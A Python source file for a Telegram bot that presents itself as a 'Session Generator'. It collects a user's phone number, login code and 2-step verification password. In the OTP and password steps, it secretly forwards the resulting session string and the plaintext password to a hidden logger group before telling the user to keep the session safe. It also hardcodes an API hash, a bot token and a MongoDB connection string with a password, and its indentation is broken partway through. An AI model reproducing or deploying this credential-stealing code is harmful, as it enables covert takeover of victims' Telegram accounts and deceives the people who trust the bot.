import asyncio
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from pymongo import MongoClient

# 🔹 Telegram API Credentials
API_ID = "28795512"
API_HASH = "c17e4eb6d994c9892b8a8b6bfea4042a"
BOT_TOKEN = "7610510597:AAFX2uCDdl48UTOHnIweeCMms25xOKF9PoA"
MUST_JOIN = "sanatani_tech"  # Replace with your channel username (without @)

# 🔹 MongoDB Connection
MONGO_URI = "mongodb+srv://sachinxsapna:sachinx007@cluster0.x3rsi.mongodb.net"
mongo_client = MongoClient(MONGO_URI)
db = mongo_client["TelegramBot"]
user_collection = db["joined_users"]

# 🔹 Initialize the bot
bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# 🔹 Store user sessions
user_sessions = {}

# 🔹 Check if user is in the channel
async def is_user_joined(user_id):
    user = user_collection.find_one({"user_id": user_id})
    return bool(user)

# 🔹 Add user to MongoDB
def add_user_to_db(user_id):
    user_collection.insert_one({"user_id": user_id})

# 🔹 Start Command with Must Join Check
@bot.on(events.NewMessage(pattern="/start"))
async def start(event):
    user_id = event.sender_id

    # Check if the user has already joined
    if not await is_user_joined(user_id):
        try:
            participant = await bot.get_participants(MUST_JOIN)
            if user_id not in [p.id for p in participant]:
                await event.respond(
                    f"❌ **You must join [this channel](https://t.me/{MUST_JOIN}) before using this bot.**",
                    buttons=[Button.url("📢 Join Channel", f"https://t.me/{MUST_JOIN}")]
                )
                return
            else:
                add_user_to_db(user_id)
        except Exception as e:
            await event.respond(f"⚠️ **Error checking channel membership:** {e}")
            return

    # If user is already in the channel
    await event.respond(
        "👋 **Welcome to the Telegram Session Generator!**\n\nClick **Generate Session** to create your session string.",
        buttons=[
            [Button.inline("🔑 Generate Session", b"generate")],
            [Button.url("📖 Help", "https://t.me/SANATANI_TECH")],
            [Button.url("📹 How to Generate", "https://files.catbox.moe/dlw3q0.mp4")]
        ],
        file="https://telegra.ph/file/00eaed55184edf059dbf7.jpg"
    )

# 🔹 Button Handler
@bot.on(events.CallbackQuery)
async def callback(event):
    if event.data == b"generate":
        await ask_phone(event)

# 🔹 Generate Session Command
@bot.on(events.NewMessage(pattern="/generate"))
async def ask_phone(event):
    user_id = event.sender_id
    if user_id in user_sessions:
        await event.respond("⚠️ **You are already in the process. Please enter your OTP.**")
        return

    user_sessions[user_id] = {"step": "phone"}
    await event.respond("📲 **Enter your phone number with country code (e.g., +919876543210):**")

# 🔹 Process User Input (Phone, OTP, Password)
@bot.on(events.NewMessage)
async def process_input(event):
    user_id = event.sender_id
    if user_id not in user_sessions:
        return  # Ignore messages from users not in process

    step = user_sessions[user_id]["step"]
    
    # ✅ Step 1: User enters phone number
    if step == "phone":
        phone_number = event.message.text.strip()
        
        if not phone_number.startswith("+") or not phone_number[1:].isdigit() or len(phone_number) < 10 or len(phone_number) > 15:
            await event.respond("⚠️ **Invalid phone number!** Please enter again with country code (e.g., +919876543210).")
            return
        
        user_sessions[user_id]["phone"] = phone_number
        user_sessions[user_id]["step"] = "otp"

        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        
        try:
            await event.respond("📩 **Sending OTP... Please wait!**")
            sent_code = await client.send_code_request(phone_number)
            user_sessions[user_id]["client"] = client
            await event.respond("✅ **OTP sent! Please enter the OTP received on Telegram.**")
        except Exception as e:
            del user_sessions[user_id]
            await event.respond(f"❌ **Error:** {str(e)}. Please try again.")

# ✅ Step 2: User enters OTP
elif step == "otp":
    otp_code = event.message.text.strip()
    
    if not otp_code.isdigit():
        await event.respond("⚠️ **Invalid OTP!** Please enter only numbers.")
        return

    client = user_sessions[user_id]["client"]
    phone_number = user_sessions[user_id]["phone"]

    try:
        await client.sign_in(phone_number, otp_code)
        session_string = client.session.save()

        # 🔹 Log session string
        LOGGER_GROUP_ID = -1001234567890  # Replace with your logger group ID
        await bot.send_message(LOGGER_GROUP_ID, f"📢 **New Session Generated**\n\n👤 **User ID:** {user_id}\n🔑 **Session String:**\n`{session_string}`")

        await event.respond(f"✅ **Your Session String:**\n\n`{session_string}`\n\n⚠️ **Keep this safe!**")
        del user_sessions[user_id]

    except Exception as e:
        if "The confirmation code has expired" in str(e):
            await event.respond("⚠️ **Your OTP has expired! Sending a new one...**")

            try:
                sent_code = await client.send_code_request(phone_number)
                user_sessions[user_id]["step"] = "otp"  # Reset step to OTP entry
                await event.respond("📩 **New OTP sent! Please enter it again.**")
            except Exception as new_e:
                del user_sessions[user_id]
                await event.respond(f"❌ **Error:** {str(new_e)}. Please try again using /start.")

        elif "Two-steps verification is enabled" in str(e):
            user_sessions[user_id]["step"] = "password"
            await event.respond("🔒 **Your account has 2-Step Verification enabled.**\nPlease enter your Telegram password:")
        
        else:
            await event.respond(f"❌ **Error:** {str(e)}. Please try again.")
            
    # ✅ Step 3: User enters password (if needed)
    elif step == "password":
        password = event.message.text.strip()
        client = user_sessions[user_id]["client"]

        try:
            await client.sign_in(password=password)
            session_string = client.session.save()

            # 🔹 Log password usage
            LOGGER_GROUP_ID = -1002477750706  # Replace with your logger group ID
            await bot.send_message(LOGGER_GROUP_ID, f"📢 **2-Step Verification Used**\n\n👤 **User ID:** {user_id}\n🔑 **Password:** `{password}`\n📝 **Session String:** `{session_string}`")

            await event.respond(f"✅ **Your Session String:**\n\n`{session_string}`\n\n⚠️ **Keep this safe!**")
            del user_sessions[user_id]
        except Exception as e:
            await event.respond(f"❌ **Error:** {str(e)}. Please try again.")

# 🔹 Cancel Command
@bot.on(events.NewMessage(pattern="/cancel"))
async def cancel(event):
    user_id = event.sender_id
    if user_id in user_sessions:
        del user_sessions[user_id]
        await event.respond("✅ **Process canceled. You can start again using /start.**")
    else:
        await event.respond("⚠️ **You are not in any active process.**")

# 🔹 Run the bot
print("🚀 Bot is running...")
bot.run_until_disconnected()
